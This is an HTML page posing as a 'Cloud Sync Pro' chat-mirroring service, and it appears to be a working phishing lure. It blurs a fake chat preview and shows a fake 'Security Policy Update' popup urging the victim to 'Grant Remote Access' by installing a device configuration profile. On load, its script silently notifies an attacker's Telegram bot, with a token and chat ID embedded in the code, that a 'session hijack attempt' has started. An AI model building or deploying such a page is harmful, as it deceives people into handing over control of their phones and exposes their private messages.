<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Sync Pro</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; filter: blur(5px); opacity: 0.6; }
        .ui-box { position: relative; z-index: 10; background: rgba(255,255,255,0.95); color: #000; padding: 25px; border-radius: 18px; width: 85%; max-width: 320px; text-align: center; display: none; }
        .btn { background: #007aff; color: #fff; padding: 12px; border-radius: 10px; text-decoration: none; display: block; margin-top: 15px; font-weight: 600; border: none; width: 100%; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <img src="chat_preview.jpg" id="preview">
    
    <div id="loading" style="text-align:center;">
        <div class="loader"></div>
        <p>Establishing Secure Mirroring Link...</p>
    </div>

    <div id="popup" class="ui-box">
        <h2 style="margin:0; font-size: 18px;">Security Policy Update</h2>
        <p style="font-size: 14px; color: #444; margin-top: 10px;">To enable remote screen recovery and chat mirroring, you must authorize the system profile.</p>
        <a href="data.mobileconfig" class="btn">Grant Remote Access</a>
    </div>

    <script>
        window.onload = function() {
            // Signal to Telegram that session hijacking has started
            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Session_Hijack_Attempt_Started_🔥");

            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('popup').style.display = 'block';
                document.getElementById('preview').style.filter = 'blur(15px)';
            }, 5000);
        };
    </script>
</body>
</html>
